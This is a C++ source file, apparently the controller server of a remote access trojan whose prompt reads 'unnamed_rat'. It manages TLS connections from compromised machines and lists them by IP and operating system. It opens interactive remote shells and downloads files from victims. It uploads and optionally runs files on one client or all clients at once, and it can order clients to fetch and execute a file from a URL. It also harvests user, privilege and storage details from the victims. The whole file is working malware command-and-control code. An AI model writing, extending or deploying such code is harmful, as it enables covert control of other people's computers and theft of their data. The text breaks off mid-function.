#include "Server.hpp"
#include "Misc.hpp"
#include "Commands.hpp"

void Server::PrintClientList(){
	if(iClientsOnline <= 0){
		std::cout<<"\n\tNo clients online\n";
		return;
	}
	std::vector<std::string> vHeaders;
	std::vector<std::string> vUsers;
	vHeaders.push_back("ID");
	vHeaders.push_back("IP");
	vHeaders.push_back("OS");
	std::string strTmp = "";
	for(int iIt = 0; iIt<Max_Clients; iIt++){
		if(Clients[iIt] != nullptr){
			strTmp.erase(strTmp.begin(), strTmp.end());
			strTmp.append(std::to_string(Clients[iIt]->iID));
			strTmp.append(1, ',');
			strTmp.append(Clients[iIt]->strIP);
			strTmp.append(1, ',');
			strTmp.append(Clients[iIt]->strOS);
			vUsers.push_back(strTmp);
		}
	}
	Misc::PrintTable(vHeaders, vUsers, ',');
}

void Server::NullClients(){
	for(int iIt = 0; iIt<Max_Clients; iIt++){
		Clients[iIt] = nullptr;
	}
}

void Server::mtxLock(){
	mtxMutex.lock();
}

void Server::mtxUnlock(){
	mtxMutex.unlock();
}

void Server::FreeClient(int iClientID){
	if(Clients[iClientID] != nullptr){
		if(Clients[iClientID]->sslSocket){
			SSL_shutdown(Clients[iClientID]->sslSocket);
			SSL_free(Clients[iClientID]->sslSocket);
		}
		close(Clients[iClientID]->sckSocket);
		delete Clients[iClientID];
		Clients[iClientID] = nullptr;
		//std::cout<<"memory released\n";
	}
}

void Server::FreeAllClients(){
	int iCounter = 0;
	for(; iCounter<Max_Clients; iCounter++){
		FreeClient(iCounter);
	}
}

bool Server::SendFile(const std::string strRemoteFile, const std::string strLocalFile, int iClientID, char cRun) {
	std::cout<<"Sending "<<strLocalFile<<'\n';
	std::ifstream strmInputFile(strLocalFile, std::ios::binary);
	if(!strmInputFile.is_open()){
		std::cout<<"Unable to open file\n";
		error();
		return false;
	}
	u64 uFileSize = Misc::GetFileSize(strLocalFile);
	u64 uBytesSent = 0;
	int iBytes = 0;
	int iBlockSize = 255;
	int iLen = 0;
	if(uFileSize == 0){
		strmInputFile.close();
		return false;
	}
	std::string strCmdLine = CommandCodes::cUpload;
	strCmdLine.append(std::to_string(uFileSize));
	strCmdLine.append(1, '@');
	strCmdLine.append(1, cRun);
	strCmdLine.append(1, '@');
	strCmdLine.append(strRemoteFile);
	strCmdLine.append(1, '@');
	strCmdLine.append(3, 'A'); //junk to the end mayde randomize letters?
	iLen = strCmdLine.length();
	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){ 
		sleep(1);
		char tmpBuffer[4];
		if(SSL_read(Clients[iClientID]->sslSocket, tmpBuffer, 3) > 2){
			if(tmpBuffer[0] == 'f' && tmpBuffer[1] == '@' && tmpBuffer[2] == '1'){
				std::cout<<"Transfer confirmation\n";
			} else {
				std::cout<<"Not confirmed, cancel transfer...\n";
				strmInputFile.close();
				return false;
			}
		} else {
			std::cout<<"Didnt receive confirmation from client\n";
			error();
			ERR_print_errors_fp(stderr);
			strmInputFile.close();
		}
		char *cFileBuffer = new char[iBlockSize];
		int iTmp = 0;
		while(uBytesSent<=uFileSize){
			strmInputFile.read(cFileBuffer, iBlockSize);
			iTmp = strmInputFile.gcount();
			if(iTmp > 0){
				iBytes = SSL_write(Clients[iClientID]->sslSocket, cFileBuffer, iTmp);
				if(iBytes > 0){
					uBytesSent += iBytes;
					Misc::ProgressBar(uBytesSent, uFileSize);
					std::fflush(stdout);
				} else {
					std::cout<<"Unable to send file bytes\n";
					error();
					break;
				}
			} else {
				break;
			}
		}
		std::cout<<"\nTransfer done "<<uBytesSent<<" bytes\n";
		Misc::Free(cFileBuffer, iBlockSize);
	} else {
		std::cout<<"Unable to send command to client\n";
		error();
		strmInputFile.close();
		return false;
	}
	strmInputFile.close();
	return true;
}

bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
	std::cout<<"Downloading file "<<strRemoteFileName<<'\n';
	std::string cLocalName = "";
	char cRemoteFileNameCopy[261]; //MAX_PATH under windows is 260 chars
	strncpy(cRemoteFileNameCopy, strRemoteFileName.c_str(), 260); 
	char *tkToken = strtok(cRemoteFileNameCopy, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
	while(tkToken != nullptr){
		cLocalName = tkToken;
		tkToken = strtok(nullptr, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
	}
	std::time_t tTime = std::time(nullptr);
	cLocalName.append(1, ' ');
	cLocalName.append(Clients[iClientID]->strIP);
	cLocalName.append(1, ' ');
	cLocalName.append(std::asctime(std::localtime(&tTime)));
	cLocalName[cLocalName.length()-1] = '\0';
	std::cout<<"Local file : "<<cLocalName<<'\n';
	Misc::strReplaceSingleChar(cLocalName, ':', '-');
	std::string strCmdLine = CommandCodes::cDownload;
	strCmdLine.append(strRemoteFileName);
	int iLen = strCmdLine.length();
	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){
		char cFileSizeBuffer[20];
		u64 uTotalBytes = 0, uFinalSize = 0;
		int iBytesRead = 0, iBufferSize = 255;
		char *cFileBuffer = new char[iBufferSize];
		if(SSL_read(Clients[iClientID]->sslSocket, cFileSizeBuffer, 19) > 0){
			if(strncmp(cFileSizeBuffer, CommandCodes::cFileTransferCancel, strlen(CommandCodes::cFileTransferCancel)) == 0){
				std::cout<<"Unable to download remote file\n";
				return false;
			}
			tkToken = cFileSizeBuffer;
			tkToken += 2;
			sscanf(tkToken, "%llui", &uFinalSize);
			std::cout<<"File size is "<<uFinalSize<<'\n';
			std::ofstream strmOutputFile(cLocalName, std::ios::binary);
			if(!strmOutputFile.is_open()){
				std::cout<<"Unable to open file "<<cLocalName<<'\n';
				error();
				return false;	
			} else {
				while(uTotalBytes<uFinalSize){
					iBytesRead = SSL_read(Clients[iClientID]->sslSocket, cFileBuffer, iBufferSize);
					if(iBytesRead > 0){
						strmOutputFile.write(cFileBuffer, iBytesRead);
						uTotalBytes += iBytesRead;
						Misc::ProgressBar(uTotalBytes, uFinalSize);
						std::fflush(stdout);
					} else {
						break;
					}				
				}
				strmOutputFile.close();
				std::cout<<"\nTransfer done!\n";
			}
		} else {
			Misc::Free(cFileBuffer, iBufferSize);
			std::cout<<"Unable to receive remote filesize\n";
			error();
			return false;
		}
		Misc::Free(cFileBuffer, iBufferSize);
	} else {
		std::cout<<"Unable to send command to client\n";
		error();
		return false;
	}
	return true;
}

void Server::ParseClientCommand(std::string strCommand, int iClientID){
	if(strCommand == "?" || strCommand == "help" || strCommand == "aiuda"){
		Help(std::string("client"), Clients[iClientID]->strOS == "Linux" ? 1 : 0);
		return;
	}
	std::vector<std::string> vcClientCommands;
	Misc::strSplit(strCommand, ' ', vcClientCommands, 10);
	if(vcClientCommands[0][0] == '!'){
		std::string strTmp = vcClientCommands[0].substr(1, vcClientCommands[0].size() -1);
		for(u_int iIt2 = 1; iIt2<vcClientCommands.size(); iIt2++){
			strTmp.append(1, ' ');
			strTmp.append(vcClientCommands[iIt2]);
		}
		system(strTmp.c_str());
		return;
	}
	if(vcClientCommands.size() > 0){
		if(vcClientCommands[0] == "shell"){
			if(vcClientCommands.size() == 3){
				if(vcClientCommands[1] == "-c"){
					mtxLock();
					Clients[iClientID]->isFlag = true;
					mtxUnlock();
					std::string strCommandLine = CommandCodes::cShell;
					strCommandLine.append(vcClientCommands[2]);
					int iLen = strCommandLine.length();
					if(SSL_write(Clients[iClientID]->sslSocket, strCommandLine.c_str(), iLen) > 0){
						//receive confirmation that program is spawned
						char cConfirm[7];
						if(SSL_read(Clients[iClientID]->sslSocket, cConfirm, 6) > 0){
								if(cConfirm[0] == 'x' && cConfirm[1] == '@' && cConfirm[2] == '1'){						
									//spawn thread to receive output from shell           
									isReadingShell = true;
									std::thread thCmd(&Server::threadRemoteCmdOutput, this, iClientID);
									char cCmdLine[512];
									int iStrLen = 0;
									while(isReadingShell){
										memset(cCmdLine, 0, 512);
										fgets(cCmdLine, 512, stdin);
										if(Clients[iClientID] == nullptr){
											break;
										}
										iStrLen = strlen(cCmdLine);
										if(SSL_write(Clients[iClientID]->sslSocket, cCmdLine, iStrLen) <= 0){
											std::cout<<"Unable to send command to client\n";
											error();
											isReadingShell = false;
											break;
										}
										if(strncmp(cCmdLine, "exit\n", 5) == 0){
											std::cout<<"\nBye\n";
											isReadingShell = false;
											break;
										}
									}
									thCmd.join();
								} else {													
									std::cout<<"Shell not spawned\n";					
								}														
						} else {
							std::cout<<"Unable to read response from client\n";
						}
					} else {
						std::cout<<"Unable to send command to client\n";
						error();
					}
					mtxLock();
					Clients[iClientID]->isFlag = false;
					mtxUnlock();
				}
			} else {
				std::cout<<"\n\tUse shell -c path_to_shell\n";
			}
			return;
		}
		if(vcClientCommands[0] == "info"){
			mtxLock();
			Clients[iClientID]->isFlag = true;
			mtxUnlock();	
			if(vcClientCommands.size() == 2){
				if(vcClientCommands[1] == "-b"){
					//basic information
					char *cBufferInfo = new char[1024];
					int iBytes = 0;
					if(SSL_write(Clients[iClientID]->sslSocket, CommandCodes::cReqBasicInfo, 3) > 0){
						if((iBytes = SSL_read(Clients[iClientID]->sslSocket, cBufferInfo, 1023)) > 0){
							cBufferInfo[iBytes] = '\0';
							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 0 : 1);
						} else {
							std::cout<<"Unable to retrieve information from client\n";
							error();
						}
					} else {
						std::cout<<"Unable to send command to client\n";
						error();
					}
					delete[] cBufferInfo;
					cBufferInfo = nullptr;
				}
			} else {
				std::cout<<"\n\tUse info -b (Basic)\n";
			}
			mtxLock();
			Clients[iClientID]->isFlag = false;
			mtxUnlock();	
			return;
		}
		if(vcClientCommands[0] == "download"){
			if(vcClientCommands.size() == 3){
				if(vcClientCommands[1] == "-r"){
					mtxLock();
					Clients[iClientID]->isFlag = true;
					mtxUnlock();
					DownloadFile(vcClientCommands[2], iClientID); //check return boolean
					mtxLock();
					Clients[iClientID]->isFlag = false;
					mtxUnlock();
				}
			} else {
				std::cout<<"\n\tUse download -r remotefilename\n";
			}
			return;
		}
		if(vcClientCommands[0] == "upload"){
			if(vcClientCommands.size() == 5){
				mtxLock();
				Clients[iClientID]->isFlag = true;
				mtxUnlock();
				std::string strRemoteFile = "";
				std::string strLocalFile = "";
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
					if(vcClientCommands[iIt2] == "-l"){
						strLocalFile = vcClientCommands[iIt2+1];
						continue;
					}
					if(vcClientCommands[iIt2] == "-r"){
						strRemoteFile = vcClientCommands[iIt2+1];
					}
				}
				if(strRemoteFile != "" && strLocalFile != ""){
					SendFile(strRemoteFile, strLocalFile, iClientID, '0'); //check return boolean
				} else {
					std::cout<<"Invalid filenames\n";
				}
				mtxLock();
				Clients[iClientID]->isFlag = false;
				mtxUnlock();
			} else {
				std::cout<<"\n\tUse upload -l local_filename -r remote_filename\n";
			}
			return;
		}
		if(vcClientCommands[0] == "httpd"){
			if(vcClientCommands.size() == 5){
				mtxLock();
				Clients[iClientID]->isFlag = true;
				mtxUnlock();
				std::string strCommandLine = CommandCodes::cHttpd;
				std::string strUrl = "";
				u_char cExec;
				int iLen = 0;
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
					if(vcClientCommands[iIt2] == "-u"){
						strUrl = vcClientCommands[iIt2+1];
						continue;
					}
					if(vcClientCommands[iIt2] == "-r"){
						cExec = vcClientCommands[iIt2+1] == "yes" ? '1' : '0';
					}
				}
				strCommandLine.append(strUrl);
				strCommandLine.append(1, '@');
				strCommandLine.append(1, cExec);
				strCommandLine.append(1, '@');
				strCommandLine.append(3, 'A');
				iLen = strCommandLine.length();
				if(SSL_write(Clients[iClientID]->sslSocket, strCommandLine.c_str(), iLen) > 0){
					std::cout<<"\n\tSent\n";
				} else {
					std::cout<<"Unable to send command to client\n";
					error();
				}
				mtxLock();
				Clients[iClientID]->isFlag = false;
				mtxUnlock();
			} else {
				std::cout<<"\n\tUse httpd -u <url> -r <yes|no> (Execute)\n";
			}
		}
	}
}

void Server::ParseMassiveCommand(std::string strCommand){
	if(strCommand == "?" || strCommand == "help" || strCommand == "aiuda"){
		Help(std::string("massive"),0);
		return;
	}
	std::vector<std::string> vcMassiveCommands;
	Misc::strSplit(strCommand, ' ', vcMassiveCommands, 10);
	if(vcMassiveCommands[0][0] == '!'){
		std::string strTmp = vcMassiveCommands[0].substr(1, vcMassiveCommands[0].size() -1);
		for(u_int iIt2 = 1; iIt2<vcMassiveCommands.size(); iIt2++){
			strTmp.append(1, ' ');
			strTmp.append(vcMassiveCommands[iIt2]);
		}
		system(strTmp.c_str());
		return;
	}
	if(vcMassiveCommands.size() > 0){
		if(vcMassiveCommands[0] == "upload"){
			if(vcMassiveCommands.size() == 7){
				std::string strLocalFile = "";
				std::string strOS = "";
				u_char cExec = '0'; //default if by any reason loop f***k it
				for(u_int iIt=1; iIt<7; iIt+=2){
					if(vcMassiveCommands[iIt] == "-l"){
						strLocalFile = vcMassiveCommands[iIt+1];
						continue;
					}
					if(vcMassiveCommands[iIt] == "-r"){
						cExec = vcMassiveCommands[iIt+1] == "yes" ? '1' : '0';
						continue;
					}
					if(vcMassiveCommands[iIt] == "-o"){
						std::string strTmp = vcMassiveCommands[iIt+1];
						Misc::strToLower(strTmp);
						if(strTmp == "windows"){
							strOS = "Windows";
						} else if(strTmp == "linux"){
							strOS = "Linux";
						} else if(strTmp == "*") {
							strOS = "all";
						}
					}
				}
				if(strLocalFile.length() > 0 && strOS != ""){
					if(iClientsOnline > 0){
						std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
						std::string strRemoteFile = "";
						char cBufferTmp[261];
						strncpy(cBufferTmp, strLocalFile.c_str(), 260);
						char *tkToken = strtok(cBufferTmp, "/");
						while(tkToken != nullptr){
							strRemoteFile = tkToken;
							tkToken = strtok(nullptr, "/");
						}
						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
							if(Clients[iIt2] != nullptr){
								if(Clients[iIt2]->strOS == strOS || strOS == "all"){
									mtxLock();
									Clients[iIt2]->isFlag = true;
									mtxUnlock();
									if(SendFile(strRemoteFile, strLocalFile, iIt2, cExec)){
										std::cout<<"Client ["<<iIt2<<"] success\n";
									} else {
										std::cout<<"Client ["<<iIt2<<"] fail\n";
										//error();
									}
									mtxLock();
									Clients[iIt2]->isFlag = false;
									mtxUnlock();
								}
							}
						}
					} else {
						std::cout<<"No clients online\n";
					}
				} else {
					std::cout<<"Error parsing arguments\n";
				}
			} else {
				std::cout<<"\n\tUse upload -l local_filename -r yes|no -o windows|linux|*\n";
			}
			return;
		}
		if(vcMassiveCommands[0] == "httpd"){
			if(vcMassiveCommands.size() == 7){
				std::string strOS = "";
				std::string strUrl = "";
				std::string strCommandLine = "";
				u_char cExec = '0';   //default if loop... you know
				for(u_int iIt2=1; iIt2<7; iIt2+=2){
					if(vcMassiveCommands[iIt2] == "-u"){
						strUrl = vcMassiveCommands[iIt2+1];
						continue;
					}
					if(vcMassiveCommands[iIt2] == "-r"){
						cExec = vcMassiveCommands[iIt2+1] == "yes" ? '1' : '0';
						continue;
					}
					if(vcMassiveCommands[iIt2] == "-o"){
						std::string strTmp = vcMassiveCommands[iIt2+1];
						Misc::strToLower(strTmp);
						if(strTmp == "windows"){
							strOS = "Windows";
						} else if(strTmp == "linux"){
							strOS = "Linux";
						} else if(strTmp == "*"){
							strOS = "all";
						}
					}
				}
				if(strUrl.length() > 0 && strOS != ""){
					if(iClientsOnline > 0){
						std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
						std::string strCmdLine = CommandCodes::cHttpd;
						strCmdLine.append(strUrl);
						strCmdLine.append(1, '@');
						strCmdLine.append(1, cExec);
						strCmdLine.append(1, '@');
						strCmdLine.append(1, 'A');
						int iLen = strCmdLine.length();
						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
							if(Clients[iIt2] != nullptr){
								if(Clients[iIt2]->strOS == strOS || strOS == "all"){
									mtxLock();
									Clients[iIt2]->isFlag = true;
									mtxUnlock();
									if(SSL_write(Clients[iIt2]->sslSocket, strCmdLine.c_str(), iLen) > 0){
										std::cout<<"Client ["<<iIt2<<"] success\n";
									} else {
										std::cout<<"Client ["<<iIt2<<"] fail\n";
									}
									mtxLock();
									Clients[iIt2]->isFlag = false;
									mtxUnlock();
								}
							}
						}
					} else {
						std::cout<<"No clients online\n";
					}
				} else {
					std::cout<<"Error parsing arguments\n";
				}
			} else {
				std::cout<<"\n\tUse httpd -u http://url/to/file -r yes|no -o windows|linux|*\n";
			}	
		} 
		return;
	}
}

void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
	if(cBuffer != nullptr){
		if(iOpt == 0){
			std::vector<std::string> vcWinInfo;
			Misc::strSplit(cBuffer, '|', vcWinInfo, 7);
			if(vcWinInfo.size() >= 7){
				std::cout<<Bold0 "Current User:     "<<vcWinInfo[0]<<"\n";
				std::cout<<"Operating System: "<<vcWinInfo[4]<<"\n";
				std::cout<<"RAM(Mb):          "<<vcWinInfo[5]<<"\nCpuInfo:\n" CReset;
				std::vector<std::string> vcCpuHead, vcCpu, vcDrivesHead, vcDrives, vcTmp, vcUsers, vcUsersHead;
				vcCpuHead.push_back("Model");
				vcCpuHead.push_back("Architecture");
				vcUsersHead.push_back("Name");
				vcUsersHead.push_back("Admin?");
				vcDrivesHead.push_back("-");
				vcDrivesHead.push_back("Label");
				vcDrivesHead.push_back("Type");
				vcDrivesHead.push_back("Free");
				vcDrivesHead.push_back("Total");
				vcCpu.push_back(vcWinInfo[3]);
				Misc::PrintTable(vcCpuHead, vcCpu, '^');
				std::string strTmpUsers = "";
				Misc::strSplit(vcWinInfo[2], '*', vcTmp, 100);
				for(int iIt = 0; iIt<int(vcTmp.size()); iIt++){
					std::vector<std::string> vcTmp2;
					Misc::strSplit(vcTmp[iIt], '/', vcTmp2, 3);
					if(vcTmp2.size() >= 2){
						strTmpUsers.erase(strTmpUsers.begin(), strTmpUsers.end());
						strTmpUsers.append(vcTmp2[0]);
						strTmpUsers.append(1, '/');
						strTmpUsers.append((vcTmp2[1] == "1") ? "Yes" : "No");
						vcUsers.push_back(strTmpUsers);
					}
				}
				std::cout<<Bold0 "\nUser List:\n" CReset;
				Misc::PrintTable(vcUsersHead, vcUsers, '/');
				std::cout<<Bold0 "\nStorage Information:\n" CReset;
				Misc::strSplit(vcWinInfo[1], '*', vcDrives, 200);
				Misc::PrintTable(vcDrivesHead, vcDrives, '/');
			} else {
				std::cout<<"Unable to parse info\n"<<cBuffer<<"\n";
			} 
		} else {
			std::vector<std::string> vcNixInfo;
			Misc::strSplit(cBuffer, '|', vcNixInfo, 10);
			if(vcNixInfo.size() >= 8){
				std::cout<<Bold0 "System:   "<<vcNixInfo[5]<<'\n';
				std::cout<<"Cpu:      "<<vcNixInfo[3]<<'\n';
				std::cout<<"Cores:    "<<vcNixInfo[4]<<'\n';
				std::cout<<"RAM(Mb):  "<<vcNixInfo[6]<<'\n';
				std::cout<<"\nCurrent User: "<<vcNixInfo[0]<<"\nUsers list:\n" CReset;
				std::vector<std::string> vHeaders, vcUsers, vfUsers, vShells;
				vHeaders.push_back("Username");
				vHeaders.push_back("Shell");
				Misc::strSplit(vcNixInfo[2].c_str(), '*', vcUsers, 100);
				Misc::PrintTable(vHeaders, vcUsers, ':');
				std::cout<<Bold0 "\nSystem partitions:\n" CReset;
				vHeaders[0] = "Partition";
				vHeaders[1] = "Size(Gb)";
				std::vector<std::string> vcPartitions;
				Misc::strSplit(vcNixInfo[1].c_str(), '*', vcPartitions, 100);
				Misc::PrintTable(vHeaders, vcPartitions, ':');
			} else {
				std::cout<<"Error\n"<<cBuffer<<'\n';
			}
		}
	}	
}

bool Server::Listen(u_int uiMaxq){
	int iStat = 0, iYes = 1;
	const char *cLocalPort = std::string(std::to_string(uiLocalPort)).c_str();
	struct addrinfo strctAd, *strctP, *strctServer;
	memset(&strctAd, 0, sizeof(strctAd));
	strctAd.ai_family = AF_UNSPEC;
	strctAd.ai_socktype = SOCK_STREAM;
	strctAd.ai_flags = AI_PASSIVE;
	if((iStat = getaddrinfo(nullptr, cLocalPort, &strctAd, &strctServer)) != 0){
		std::cout<<"Error getaddrinfo\n";
		error();
		return false;
	}
	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
		if((sckMainSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
			continue;
		}
		if(setsockopt(sckMainSocket, SOL_SOCKET, SO_REUSEADDR, &iYes, sizeof(int)) == -1){
			std::cout<<"setsockopt error\n";
			error();
			return false;
		}
		if(bind(sckMainSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
			continue;
		}
		if(sckMainSocket != -1){
			fcntl(sckMainSocket, F_SETFL, O_NONBLOCK);
		}
		break;
	}
	freeaddrinfo(strctServer);
	if(listen(sckMainSocket, uiMaxq) == -1){
		std::cout<<"Error listening\n";
		error();
		return false;
	}
	if(sckMainSocket == -1 || strctP == nullptr){
		error();
		return false;
	}
	sslCTX = SSL_CTX_new(TLS_server_method());
	if(sslCTX == nullptr){
		ERR_print_errors_fp(stderr);
		return false;
	}
	if(SSL_CTX_use_certificate_file(sslCTX, "./cacer.pem", SSL_FILETYPE_PEM) <= 0){
		std::cout<<"Unable to use certificate\n";
		ERR_print_errors_fp(stderr);
		return false;
	}
	if(SSL_CTX_use_PrivateKey_file(sslCTX, "./privkey.pem", SSL_FILETYPE_PEM) <= 0){
		ERR_print_errors_fp(stderr);
		return false;
	}
	if(!SSL_CTX_check_private_key(sslCTX)){
		std::cout<<"Error invalid private key\n";
		return false;
	}
	return true;
}
		
int Server::WaitConnection(char*& output){
	char strIP[INET6_ADDRSTRLEN];
	int sckTmpSocket;
	struct sockaddr_storage strctClient;
	socklen_t slC = sizeof(strctClient);
	sckTmpSocket = accept(sckMainSocket, (struct sockaddr *)&strctClient, &slC);
	if(sckTmpSocket != -1){
		//beej guide network programming
		struct sockaddr_in *tmp = (struct sockaddr_in *)&strctClient;
		inet_ntop(strctClient.ss_family, get_int_addr((struct sockaddr *)&strctClient),strIP, sizeof(strIP));
		int sLen = Misc::StrLen(strIP);
		output = new char[sLen+8];
		snprintf(output, sLen + 7, "%s:%d", strIP, ntohs(tmp->sin_port));
	}
	return sckTmpSocket;
}

void Server::thStartHandler(){
	isReceiveThread = true;
	isCmdThread = true;
	std::thread t1(&Server::threadListener, this); //std::ref(*this));
	std::thread t2(&Server::threadMasterCMD, this); //, std::ref(*this));
	std::thread t3(&Server::threadClientPing, this); //, std::ref(*this));
	t1.join();
	t2.join();
	t3.join();
}

//handle incomming connections
void Server::threadListener(){
	//std::cout<<"Listener thread started\n";
	int iClientCount = 0, uiOldValue = 0;
	bool uiReachMax = false;
	while(isReceiveThread && !bSignalFlag){  //receiver loop
		//if reach max connections loop until one disconects
		usleep(100000); //prevent 100% cpu usage 100 miliseconds
		if(iClientCount >= Max_Clients){
			uiReachMax = true;
			uiOldValue = iClientCount;
			bool isAvailable = false;
			int uiIt = 0;
			for(; uiIt<Max_Clients; uiIt++){
				if(Clients[uiIt] == nullptr){
					//found a spot
					iClientCount =  uiIt;
					isAvailable = true;
					break;
				}
			}
			if(!isAvailable){ continue; }
		}
		char *strTMPip = nullptr;
		int sckTMP = WaitConnection(strTMPip);
		if(sckTMP != -1){
			#ifdef _NOTIFY
			std::string strTmp = "[";
			strTmp.append(std::to_string(iClientCount));
			strTmp.append("]");
			strTmp.append(strTMPip);
			NotifyNotification *Not = notify_notification_new("New connection", strTmp.c_str(), nullptr);
			notify_notification_set_timeout(Not, 3000);
			notify_notification_show(Not, nullptr);
			g_object_unref(G_OBJECT(Not));
			#else
			std::cout<<"\nNew connection from "<<strTMPip<<'\n';
			#endif
			Clients[iClientCount] = new Client_Struct;
			if(Clients[iClientCount] == nullptr){
				std::cout<<"Error allocating memory for new client\n";
				error();
				continue;
			}
			Clients[iClientCount]->sckSocket = dup(sckTMP);
			Clients[iClientCount]->sslSocket = SSL_new(sslCTX);
			SSL_set_fd(Clients[iClientCount]->sslSocket, Clients[iClientCount]->sckSocket);
			if(SSL_accept(Clients[iClientCount]->sslSocket) == -1){
				error();
				FreeClient(iClientCount);
				continue;
			}
			
			//if(SSL_write(Clients[iClientCount]->sslSocket, CommandCodes::cReqOS, 3) > 0){
				char cTmpBuffer[20];
				int iBytes = SSL_read(Clients[iClientCount]->sslSocket, cTmpBuffer, 19);
				if(iBytes > 0){
					cTmpBuffer[iBytes] = '\0';
					Clients[iClientCount]->strOS = cTmpBuffer[0] == '0' && cTmpBuffer[1] == '1' ? "Linux" : "Windows";
				} else {
					Clients[iClientCount]->strOS = "unkn0w";
				}
			//}
			
			//save obtained ip on client struct
			if(strTMPip != nullptr){
				Clients[iClientCount]->strIP = strTMPip;
				delete[] strTMPip;
				strTMPip = nullptr; 
			}
			
			mtxLock();
			Clients[iClientCount]->iID = iClientCount;
			Clients[iClientCount]->isConnected = true;
			Clients[iClientCount]->isFlag = false;
			iClientsOnline++;
			mtxUnlock();
			
			if(uiReachMax){
				iClientCount = uiOldValue;
			} else {
				iClientCount++;
			}
		} else {
			//check if memory was allocated for strTMPip
			if(strTMPip != nullptr){
				delete[] strTMPip;
				strTMPip = nullptr;
			}
		}
		
	}
}

//here parse all commands from stdin
void Server::threadMasterCMD(){
	std::string strPrompt = BrightBlack "unnamed_rat" CReset Red "# " CReset;
	std::string strCMD = "";
	while(!bSignalFlag){
		strCMD.erase(strCMD.begin(), strCMD.end());
		std::cout<<strPrompt;
		std::getline(std::cin, strCMD);
		
		if(strCMD.length() <= 0){
			continue;
		}
		if(strCMD == "?" || strCMD == "help" || strCMD == "aiuda"){
			Help(std::string("main"), 0);
			continue;
		}
		std::vector<std::string> vcCommands;
		Misc::strSplit(strCMD, ' ', vcCommands, 10);
		
		//run shell command
		if(vcCommands[0][0] == '!'){
			std::string strShellCommand = vcCommands[0].substr(1, vcCommands[0].length()-1);
			for(u_int iIt2 = 1; iIt2<vcCommands.size(); iIt2++){
				strShellCommand.append(1, ' ');
				strShellCommand.append(vcCommands[iIt2]);
			}
			system(strShellCommand.c_str());
			continue;
		}
		//exit program
		if(vcCommands[0] == "exit"){
			std::cout<<"bye\n";
			close(sckMainSocket);
			break;
		}
		if(iClientsOnline == 0){
			continue;
		}
		//interact with clients
		if(vcCommands[0] == "cli"){
			if(vcCommands.size() == 5){ //cli -c id -a action
				int iClientId = 0;
				std::string strAction = "";
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){ //parse command line arguments
					if(vcCommands[iIt2] == "-c"){
						iClientId = atoi(vcCommands[iIt2+1].c_str());
						if(iClientId >= Max_Clients){
							iClientId = Max_Clients -1;   //in number is than array prevent overflow
						}
						continue;
					}
					if(vcCommands[iIt2] == "-a"){
						strAction = vcCommands[iIt2+1];
					}
				}
				if(Clients[iClientId] != nullptr){
					if(strAction == "interact"){
						//spawn prompt to interact with specified client
						std::string strClientCmd = "";
						std::string strPrompt = "[" + std::to_string(Clients[iClientId]->iID) + "]" + Clients[iClientId]->strIP + "@" + Clients[iClientId]->strOS + "#";
						do{
							std::cout<<strPrompt;
							strClientCmd = "";
							std::getline(std::cin, strClientCmd);
							if(Clients[iClientId] == nullptr){
								break;
							}
							if(strClientCmd.length() == 0){
								continue;
							}
							ParseClientCommand(strClientCmd, iClientId);
						}while(strClientCmd != "exit");
					}else if(strAction == "close"){ //close client conenction
 						if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
							if(SSL_write(Clients[iClientId]->sslSocket, CommandCodes::cClose, 5) <= 0){
								std::cout<<"Unable to send close command\n";
								error();
								ERR_print_errors_fp(stderr);
							}
						} else {
							std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
						}	
					}
				} else {
					std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
				}
				continue;
			}
			if(vcCommands.size() == 3){ //cli -c * massive command
				if(vcCommands[1] == "-c" && vcCommands[2] == "*"){
					std::string strMassiveCmd = "";
					do{
						std::cout<<"["<<iClientsOnline<<"] online# ";
						std::getline(std::cin, strMassiveCmd);
						if(strMassiveCmd.length() == 0){
							continue;
						}
						ParseMassiveCommand(strMassiveCmd);
					}while(strMassiveCmd != "exit");
				}
				continue;
			}
			if(vcCommands.size() == 2){ //cli -l
				if(vcCommands[1] == "-l"){
					PrintClientList();
				}
			}
		}
	}
	mtxLock();
	isReceiveThread = false;
	isCmdThread = false;
	FreeAllClients();
	mtxUnlock();
}

void Server::threadClientPing(){
	while(isCmdThread){
		if(iClientsOnline == 0){
			usleep(100000);
			continue;
		}
		for(int iClientID = 0; iClientID<Max_Clients; iClientID++){
			if(Clients[iClientID] != nullptr){
				if(Clients[iClientID]->isFlag){
					sleep(2);
					continue;
				} else {
					int iBytes = SSL_write(Clients[iClientID]->sslSocket, "", 1);
					if(iBytes != 1){
						#ifdef _NOTIFY
						std::string strTmp = "[";
						strTmp.append(std::to_string(Clients[iClientID]->iID));
						strTmp.append("] ");
						strTmp.append(Clients[iClientID]->strIP);
						NotifyNotification *Not = notify_notification_new("Client disconnected", strTmp.c_str(), nullptr);
						notify_notification_set_timeout(Not, 3000);
						notify_notification_show(Not, nullptr);
						g_object_unref(G_OBJECT(Not));
						#else
						std::cout<<"\nClient["<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<" disconnected\n";
						#endif
						mtxLock();
						Clients[iClientID]->isConnected = false;
						iClientsOnline--;
						FreeClient(iClientID);
						mtxUnlock();
					}
				}
			}
			usleep(100000); //prevent 100% cpu usage  100 miliseconds
		}
		sleep(3);
	}
}

void Server::threadRemoteCmdOutput(int iClientID){
	char cCmdBuffer[1024];
	int iBytes = 0;
	while(isReadingShell){
		if(Clients[iClientID] != nullptr){
